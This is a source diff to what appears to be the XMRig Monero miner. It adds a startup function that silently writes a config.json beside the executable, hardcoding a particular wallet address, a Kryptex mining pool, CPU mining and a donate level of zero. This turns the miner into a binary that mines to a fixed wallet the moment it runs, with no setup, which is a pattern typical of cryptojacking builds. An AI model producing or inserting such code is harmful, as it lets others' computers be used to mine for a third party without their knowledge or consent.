@@ -20,9 +20,78 @@
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
 
+#include <cstdio>
+#include <cstring>
+
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <libgen.h>
+#include <linux/limits.h>
+#endif
+
+static void write_default_config(const char *argv0)
+{
+    static const char *cfg =
+        "{\n"
+        "    \"autosave\": true,\n"
+        "    \"cpu\": true,\n"
+        "    \"opencl\": false,\n"
+        "    \"cuda\": false,\n"
+        "    \"donate-level\": 0,\n"
+        "    \"pools\": [\n"
+        "        {\n"
+        "            \"coin\": \"monero\",\n"
+        "            \"algo\": \"rx/0\",\n"
+        "            \"url\": \"xmr-us.kryptex.network:7029\",\n"
+        "            \"user\": \"89eWJ7ccdVr3GHBAYsKG28eqWcn2PMWzYeFE5xtgWzg1UimfWS62Qq4VpUSQrX3vaDeMTAMhBVR885RxkLzXNkmFV9yXvcg\",\n"
+        "            \"pass\": \"x\",\n"
+        "            \"tls\": false,\n"
+        "            \"keepalive\": true,\n"
+        "            \"nicehash\": false\n"
+        "        }\n"
+        "    ]\n"
+        "}\n";
+
+    char dir[4096] = {0};
+
+#ifdef _WIN32
+    GetModuleFileNameA(NULL, dir, sizeof(dir) - 1);
+    char *slash = strrchr(dir, '\\');
+    if (slash) *(slash + 1) = '\0';
+#else
+    ssize_t len = readlink("/proc/self/exe", dir, sizeof(dir) - 1);
+    if (len > 0) {
+        dir[len] = '\0';
+        char *slash = strrchr(dir, '/');
+        if (slash) *(slash + 1) = '\0';
+    } else {
+        strncpy(dir, "./", sizeof(dir) - 1);
+    }
+#endif
+
+    char path[4096] = {0};
+    snprintf(path, sizeof(path), "%sconfig.json", dir);
+
+    FILE *f = fopen(path, "r");
+    if (f) {
+        fclose(f);
+        return;
+    }
+
+    f = fopen(path, "w");
+    if (f) {
+        fputs(cfg, f);
+        fclose(f);
+    }
+}
+
 
 int main(int argc, char **argv)
 {
+    write_default_config(argv[0]);
+
     using namespace xmrig;
 
     Process process(argc, argv);
